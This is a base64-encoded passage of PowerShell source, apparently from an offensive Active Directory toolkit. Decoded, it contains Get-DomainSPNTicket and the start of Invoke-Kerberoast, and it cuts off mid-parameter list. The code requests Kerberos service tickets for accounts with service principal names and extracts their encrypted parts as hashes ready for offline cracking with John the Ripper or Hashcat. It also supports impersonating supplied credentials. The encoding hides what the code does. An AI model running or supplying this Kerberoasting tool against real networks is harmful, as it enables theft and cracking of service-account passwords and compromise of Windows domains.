ZXN1bHQgPSAkQWR2YXBpMzI6OlJldmVydFRvU2VsZigpOyRMYXN0RXJyb3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpOwoKICAgIGlmICgtbm90ICRSZXN1bHQpIHsKICAgICAgICB0aHJvdyAiW0ludm9rZS1SZXZlcnRUb1NlbGZdIFJldmVydFRvU2VsZigpIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgfQoKICAgIFdyaXRlLVZlcmJvc2UgIltJbnZva2UtUmV2ZXJ0VG9TZWxmXSBUb2tlbiBpbXBlcnNvbmF0aW9uIHN1Y2Nlc3NmdWxseSByZXZlcnRlZCIKfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5TUE5UaWNrZXQgewo8IwouU1lOT1BTSVMKClJlcXVlc3QgdGhlIGtlcmJlcm9zIHRpY2tldCBmb3IgYSBzcGVjaWZpZWQgc2VydmljZSBwcmluY2lwYWwgbmFtZSAoU1BOKS4KCkF1dGhvcjogbWFjaG9zZWMsIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCBlaXRoZXIgdGFrZSBvbmUvbW9yZSBTUE4gc3RyaW5ncywgb3Igb25lL21vcmUgUG93ZXJWaWV3LlVzZXIgb2JqZWN0cwoodGhlIG91dHB1dCBmcm9tIEdldC1Eb21haW5Vc2VyKSBhbmQgd2lsbCByZXF1ZXN0IGEga2VyYmVyb3MgdGlja2V0IGZvciB0aGUgZ2l2ZW4gU1BOCnVzaW5nIFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4uIFRoZSBlbmNyeXB0ZWQKcG9ydGlvbiBvZiB0aGUgdGlja2V0IGlzIHRoZW4gZXh0cmFjdGVkIGFuZCBvdXRwdXQgaW4gZWl0aGVyIGNyYWNrYWJsZSBKb2huIG9yIEhhc2hjYXQKZm9ybWF0IChkZWFmdWx0IG9mIEhhc2hjYXQpLgoKLlBBUkFNRVRFUiBTUE4KClNwZWNpZmllcyB0aGUgc2VydmljZSBwcmluY2lwYWwgbmFtZSB0byByZXF1ZXN0IHRoZSB0aWNrZXQgZm9yLgoKLlBBUkFNRVRFUiBVc2VyCgpTcGVjaWZpZXMgYSBQb3dlclZpZXcuVXNlciBvYmplY3QgKHJlc3VsdCBvZiBHZXQtRG9tYWluVXNlcikgdG8gcmVxdWVzdCB0aGUgdGlja2V0IGZvci4KCi5QQVJBTUVURVIgT3V0cHV0Rm9ybWF0CgpFaXRoZXIgJ0pvaG4nIGZvciBKb2huIHRoZSBSaXBwZXIgc3R5bGUgaGFzaCBmb3JtYXR0aW5nLCBvciAnSGFzaGNhdCcgZm9yIEhhc2hjYXQgZm9ybWF0LgpEZWZhdWx0cyB0byAnSm9obicuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBkb21haW4gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TUE5UaWNrZXQgLVNQTiAiSFRUUC93ZWIudGVzdGxhYi5sb2NhbCIKClJlcXVlc3QgYSBrZXJiZXJvcyBzZXJ2aWNlIHRpY2tldCBmb3IgdGhlIHNwZWNpZmllZCBTUE4uCgouRVhBTVBMRQoKIkhUVFAvd2ViMS50ZXN0bGFiLmxvY2FsIiwiSFRUUC93ZWIyLnRlc3RsYWIubG9jYWwiIHwgR2V0LURvbWFpblNQTlRpY2tldAoKUmVxdWVzdCBrZXJiZXJvcyBzZXJ2aWNlIHRpY2tldHMgZm9yIGFsbCBTUE5zIHBhc3NlZCBvbiB0aGUgcGlwZWxpbmUuCgouRVhBTVBMRQoKR2V0LURvbWFpblVzZXIgLVNQTiB8IEdldC1Eb21haW5TUE5UaWNrZXQgLU91dHB1dEZvcm1hdCBKVFIKClJlcXVlc3Qga2VyYmVyb3Mgc2VydmljZSB0aWNrZXRzIGZvciBhbGwgdXNlcnMgd2l0aCBub24tbnVsbCBTUE5zIGFuZCBvdXRwdXQgaW4gSlRSIGZvcm1hdC4KCi5JTlBVVFMKClN0cmluZwoKQWNjZXB0cyBvbmUgb3IgbW9yZSBTUE4gc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUgd2l0aCB0aGUgUmF3U1BOIHBhcmFtZXRlciBzZXQuCgouSU5QVVRTCgpQb3dlclZpZXcuVXNlcgoKQWNjZXB0cyBvbmUgb3IgbW9yZSBQb3dlclZpZXcuVXNlciBvYmplY3RzIG9uIHRoZSBwaXBlbGluZSB3aXRoIHRoZSBVc2VyIHBhcmFtZXRlciBzZXQuCgouT1VUUFVUUwoKUG93ZXJWaWV3LlNQTlRpY2tldAoKT3V0cHV0cyBhIGN1c3RvbSBvYmplY3QgY29udGFpbmluZyB0aGUgU2FtQWNjb3VudE5hbWUsIFNlcnZpY2VQcmluY2lwYWxOYW1lLCBhbmQgZW5jcnlwdGVkIHRpY2tldCBzZWN0aW9uLgojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU1BOVGlja2V0JyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdSYXdTUE4nKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgUGFyYW1ldGVyU2V0TmFtZSA9ICdSYXdTUE4nLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignLiovLionKV0KICAgICAgICBbQWxpYXMoJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRTUE4sCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1VzZXInLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsgJF8uUFNPYmplY3QuVHlwZU5hbWVzWzBdIC1lcSAnUG93ZXJWaWV3LlVzZXInIH0pXQogICAgICAgIFtPYmplY3RbXV0KICAgICAgICAkVXNlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdKb2huJywgJ0hhc2hjYXQnKV0KICAgICAgICBbQWxpYXMoJ0Zvcm1hdCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dHB1dEZvcm1hdCA9ICdIYXNoY2F0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICROdWxsID0gW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkV2l0aFBhcnRpYWxOYW1lKCdTeXN0ZW0uSWRlbnRpdHlNb2RlbCcpCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyJ10pIHsKICAgICAgICAgICAgJFRhcmdldE9iamVjdCA9ICRVc2VyCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0ID0gJFNQTgogICAgICAgIH0KCiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkVGFyZ2V0T2JqZWN0KSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXInXSkgewogICAgICAgICAgICAgICAgJFVzZXJTUE4gPSAkT2JqZWN0LlNlcnZpY2VQcmluY2lwYWxOYW1lCiAgICAgICAgICAgICAgICAkU2FtQWNjb3VudE5hbWUgPSAkT2JqZWN0LlNhbUFjY291bnROYW1lCiAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZE5hbWUgPSAkT2JqZWN0LkRpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVXNlclNQTiA9ICRPYmplY3QKICAgICAgICAgICAgICAgICRTYW1BY2NvdW50TmFtZSA9ICdVTktOT1dOJwogICAgICAgICAgICAgICAgJERpc3Rpbmd1aXNoZWROYW1lID0gJ1VOS05PV04nCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgYSB1c2VyIGhhcyBtdWx0aXBsZSBTUE5zIHdlIG9ubHkgdGFrZSB0aGUgZmlyc3Qgb25lIG90aGVyd2lzZSB0aGUgc2VydmljZSB0aWNrZXQgcmVxdWVzdCBmYWlscyBtaXNlcmFibHkgOikgLUBzdDNyMzBieXQzCiAgICAgICAgICAgIGlmICgkVXNlclNQTiAtaXMgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZXN1bHRQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbl0pIHsKICAgICAgICAgICAgICAgICRVc2VyU1BOID0gJFVzZXJTUE5bMF0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRUaWNrZXQgPSBOZXctT2JqZWN0IFN5c3RlbS5JZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9rZW4gLUFyZ3VtZW50TGlzdCAkVXNlclNQTgogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluU1BOVGlja2V0XSBFcnJvciByZXF1ZXN0aW5nIHRpY2tldCBmb3IgU1BOICckVXNlclNQTicgZnJvbSB1c2VyICckRGlzdGluZ3Vpc2hlZE5hbWUnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRUaWNrZXQpIHsKICAgICAgICAgICAgICAgICRUaWNrZXRCeXRlU3RyZWFtID0gJFRpY2tldC5HZXRSZXF1ZXN0KCkKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFRpY2tldEJ5dGVTdHJlYW0pIHsKICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CgogICAgICAgICAgICAgICAgJFRpY2tldEhleFN0cmVhbSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFRpY2tldEJ5dGVTdHJlYW0pIC1yZXBsYWNlICctJwoKICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2FtQWNjb3VudE5hbWUnICRTYW1BY2NvdW50TmFtZQogICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXN0aW5ndWlzaGVkTmFtZScgJERpc3Rpbmd1aXNoZWROYW1lCiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NlcnZpY2VQcmluY2lwYWxOYW1lJyAkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lCgogICAgICAgICAgICAgICAgIyBUaWNrZXRIZXhTdHJlYW0gPT0gR1NTLUFQSSBGcmFtZSAoc2VlIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM0MTIxI3NlY3Rpb24tNC4xKQogICAgICAgICAgICAgICAgIyBObyBlYXN5IHdheSB0byBwYXJzZSBBU04xLCBzbyB3ZSdsbCB0cnkgc29tZSBqYW5reSByZWdleCB0byBwYXJzZSB0aGUgZW1iZWRkZWQgS1JCX0FQX1JFUS5UaWNrZXQgb2JqZWN0CiAgICAgICAgICAgICAgICBpZigkVGlja2V0SGV4U3RyZWFtIC1tYXRjaCAnYTM4Mi4uLi4zMDgyLi4uLkEwMDMwMjAxKD88RXR5cGVMZW4+Li4pQTEuezEsNH0uLi4uLi4uQTI4Mig/PENpcGhlclRleHRMZW4+Li4uLikuLi4uLi4uLig/PERhdGFUb0VuZD4uKyknKSB7CiAgICAgICAgICAgICAgICAgICAgJEV0eXBlID0gW0NvbnZlcnRdOjpUb0J5dGUoICRNYXRjaGVzLkV0eXBlTGVuLCAxNiApCiAgICAgICAgICAgICAgICAgICAgJENpcGhlclRleHRMZW4gPSBbQ29udmVydF06OlRvVUludDMyKCRNYXRjaGVzLkNpcGhlclRleHRMZW4sIDE2KS00CiAgICAgICAgICAgICAgICAgICAgJENpcGhlclRleHQgPSAkTWF0Y2hlcy5EYXRhVG9FbmQuU3Vic3RyaW5nKDAsJENpcGhlclRleHRMZW4qMikKCiAgICAgICAgICAgICAgICAgICAgIyBNYWtlIHN1cmUgdGhlIG5leHQgZmllbGQgbWF0Y2hlcyB0aGUgYmVnaW5uaW5nIG9mIHRoZSBLUkJfQVBfUkVRLkF1dGhlbnRpY2F0b3Igb2JqZWN0CiAgICAgICAgICAgICAgICAgICAgaWYoJE1hdGNoZXMuRGF0YVRvRW5kLlN1YnN0cmluZygkQ2lwaGVyVGV4dExlbioyLCA0KSAtbmUgJ0E0ODInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIHBhcnNpbmcgY2lwaGVydGV4dCBmb3IgdGhlIFNQTiAgJCgkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lKS4gVXNlIHRoZSBUaWNrZXRCeXRlSGV4U3RyZWFtIGZpZWxkIGFuZCBleHRyYWN0IHRoZSBoYXNoIG9mZmxpbmUgd2l0aCBHZXQtS2VyYmVyb2FzdEhhc2hGcm9tQVBSZXEiCiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUaWNrZXRCeXRlSGV4U3RyZWFtJyAoW0JpdGNvbnZlcnRlcl06OlRvU3RyaW5nKCRUaWNrZXRCeXRlU3RyZWFtKS5SZXBsYWNlKCctJywnJykpCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2ggPSAiJCgkQ2lwaGVyVGV4dC5TdWJzdHJpbmcoMCwzMikpYCQkKCRDaXBoZXJUZXh0LlN1YnN0cmluZygzMikpIgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RpY2tldEJ5dGVIZXhTdHJlYW0nICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJVbmFibGUgdG8gcGFyc2UgdGlja2V0IHN0cnVjdHVyZSBmb3IgdGhlIFNQTiAgJCgkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lKS4gVXNlIHRoZSBUaWNrZXRCeXRlSGV4U3RyZWFtIGZpZWxkIGFuZCBleHRyYWN0IHRoZSBoYXNoIG9mZmxpbmUgd2l0aCBHZXQtS2VyYmVyb2FzdEhhc2hGcm9tQVBSZXEiCiAgICAgICAgICAgICAgICAgICAgJEhhc2ggPSAkbnVsbAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGlja2V0Qnl0ZUhleFN0cmVhbScgKFtCaXRjb252ZXJ0ZXJdOjpUb1N0cmluZygkVGlja2V0Qnl0ZVN0cmVhbSkuUmVwbGFjZSgnLScsJycpKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRIYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgIyBKVFIganVtYm8gb3V0cHV0IGZvcm1hdCAtICRrcmI1dGdzJFNQTi9tYWNoaW5lLnRlc3RsYWIubG9jYWw6NjMzODZkMjJkMzU5ZmUuLi4KICAgICAgICAgICAgICAgICAgICBpZiAoJE91dHB1dEZvcm1hdCAtbWF0Y2ggJ0pvaG4nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRIYXNoRm9ybWF0ID0gImAka3JiNXRnc2AkJCgkVGlja2V0LlNlcnZpY2VQcmluY2lwYWxOYW1lKTokSGFzaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkRGlzdGluZ3Vpc2hlZE5hbWUgLW5lICdVTktOT1dOJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkRGlzdGluZ3Vpc2hlZE5hbWUuU3ViU3RyaW5nKCREaXN0aW5ndWlzaGVkTmFtZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAnVU5LTk9XTicKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgIyBoYXNoY2F0IG91dHB1dCBmb3JtYXQgLSAka3JiNXRncyQyMyQqdXNlciRyZWFsbSR0ZXN0L3NwbiokNjMzODZkMjJkMzU5ZmUuLi4KICAgICAgICAgICAgICAgICAgICAgICAgJEhhc2hGb3JtYXQgPSAiYCRrcmI1dGdzYCQkKCRFdHlwZSlgJCokU2FtQWNjb3VudE5hbWVgJCRVc2VyRG9tYWluYCQkKCRUaWNrZXQuU2VydmljZVByaW5jaXBhbE5hbWUpKmAkJEhhc2giCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSGFzaCcgJEhhc2hGb3JtYXQKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkT3V0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TUE5UaWNrZXQnKQogICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gSW52b2tlLUtlcmJlcm9hc3Qgewo8IwouU1lOT1BTSVMKClJlcXVlc3RzIHNlcnZpY2UgdGlja2V0cyBmb3Iga2VyYmVyb2FzdC1hYmxlIGFjY291bnRzIGFuZCByZXR1cm5zIGV4dHJhY3RlZCB0aWNrZXQgaGFzaGVzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpLCBAbWFjaG9zZWMgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgR2V0LURvbWFpblVzZXIsIEdldC1Eb21haW5TUE5UaWNrZXQgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1Eb21haW5Vc2VyIHRvIHF1ZXJ5IGZvciB1c2VyIGFjY291bnRzIHdpdGggbm9uLW51bGwgc2VydmljZSBwcmluY2lwbGUKbmFtZXMgKFNQTnMpIGFuZCB1c2VzIEdldC1TUE5UaWNrZXQgdG8gcmVxdWVzdC9leHRyYWN0IHRoZSBjcmFja2FibGUgdGlja2V0IGluZm9ybWF0aW9uLgpUaGUgdGlja2V0IGZvcm1hdCBjYW4gYmUgc3BlY2lmaWVkIHdpdGggLU91dHB1dEZvcm1hdCA8Sm9obi9IYXNoY2F0Pi4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkuCldpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBPdXRwdXRGb3JtYXQKCkVpdGhlciAnSm9obicgZm9yIEpvaG4gdGhlIFJpcHBlciBzdHlsZSBoYXNoIGZvcm1hdHRpbmcsIG9yICdIYXNoY2F0JyBmb3IgSGFzaGNhdCBmb3JtYXQuCkRlZmF1bHRzIHRvICdIYXNoY2F0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpJbnZva2UtS2VyYmVyb2FzdCB8IGZsCgpLZXJiZXJvYXN0cyBhbGwgZm91bmQgU1BOcyBmb3IgdGhlIGN1cnJlbnQgZG9tYWluLCBvdXRwdXR0aW5nIHRvIEhhc2hjYXQgZm9ybWF0IChkZWZhdWx0KS4KCi5FWEFNUExFCgpJbnZva2UtS2VyYmVyb2FzdCAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIHwgZmwKCktlcmJlcm9hc3RzIGFsbCBmb3VuZCBTUE5zIGZvciB0aGUgdGVzdGxhYi5sb2NhbCBkb21haW4sIG91dHB1dHRpbmcgdG8gSlRSCmZvcm1hdCBpbnN0ZWFkIG9mIEhhc2hjYXQuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLW9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkludm9rZS1LZXJiZXJvYXN0IC1DcmVkZW50aWFsICRDcmVkIC1WZXJib3NlIC1Eb21haW4gdGVzdGxhYi5sb2NhbCB8IGZsCgpLZXJiZXJvYXN0cyBhbGwgZm91bmQgU1BOcyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuU1BOVGlja2V0CgpPdXRwdXRzIGEgY3VzdG9tIG9iamVjdCBjb250YWluaW5nIHRoZSBTYW1BY2NvdW50TmFtZSwgU2VydmljZVByaW5jaXBhbE5hbWUsIGFuZCBlbmNyeXB0ZWQgdGlja2V0IHNlY3Rpb24uCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuU1BOVGlja2V0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0pvaG4nLCAnSGFzaGNhdCcpXQogICAgICAgIFtBbGlhcygnRm9ybWF0JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0Rm9ybWF0ID0gJ0hhc2hjYXQnLAoKICAgICAgICBbTWFuYWd